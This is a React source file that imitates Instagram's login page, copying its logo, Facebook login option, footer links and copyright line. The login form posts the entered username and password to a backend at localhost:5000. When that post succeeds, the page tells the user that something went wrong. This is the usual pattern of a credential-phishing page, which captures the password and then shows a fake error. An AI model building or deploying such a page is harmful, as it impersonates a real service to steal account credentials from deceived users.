import './styles.css';
import { useState } from 'react';

function App() {
  // State to manage the form data
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleLogin = async (e) => {
    e.preventDefault(); // Prevent default form submission
  
    const data = { username, password };
  
    try {
      // Send POST request to backend
      const response = await fetch('http://localhost:5000/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });
  
      const result = await response.json();
  
      if (response.ok) {
        // Handle success (for example, redirect or display a message)
        alert('Somthing went wrong please try again');
      } else {
        // Handle error
        alert(result.message || 'Login failed');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('An error occurred while logging in');
    }
  };

  return (
    <div className="wrapper">
      <div className="header">
        <div className="top">
          <div className="logo">
            <img src="instagram.png" alt="instagram" style={{ width: '175px' }} />
          </div>
          <div className="form">
            <div className="input_field">
              <input
                type="text"
                placeholder="Phone number, username, or email"
                className="input"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
            </div>
            <div className="input_field">
              <input
                type="password"
                placeholder="Password"
                className="input"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
            <div className="btn">
              <button onClick={handleLogin}>Log In</button>
            </div>
          </div>
          <div className="or">
            <div className="line"></div>
            <p>OR</p>
            <div className="line"></div>
          </div>
          <div className="dif">
            <div className="fb">
              <img src="facebook.png" alt="facebook" />
              <p>Log in with Facebook</p>
            </div>
            <div className="forgot">
              <a href="/">Forgot password?</a>
            </div>
          </div>
        </div>
        <div className="signup">
          <p>
            Don't have an account? <a href="/">Sign up</a>
          </p>
        </div>
        <div className="apps">
          <p>Get the app.</p>
          <div className="icons">
            <a href="/">
              <img src="appstore.png" alt="appstore" />
            </a>
            <a href="/">
              <img src="googleplay.png" alt="googleplay" />
            </a>
          </div>
        </div>
      </div>
      <div className="footer">
        <div className="links">
          <ul>
            <li><a href="/">ABOUT US</a></li>
            <li><a href="/">SUPPORT</a></li>
            <li><a href="/">PRESS</a></li>
            <li><a href="/">API</a></li>
            <li><a href="/">JOBS</a></li>
            <li><a href="/">PRIVACY</a></li>
            <li><a href="/">TERMS</a></li>
            <li><a href="/">DIRECTORY</a></li>
            <li><a href="/">PROFILES</a></li>
            <li><a href="/">HASHTAGS</a></li>
            <li><a href="/">LANGUAGE</a></li>
          </ul>
        </div>
        <div className="copyright">© 2019 INSTAGRAM</div>
      </div>
    </div>
  );
}

export default App;
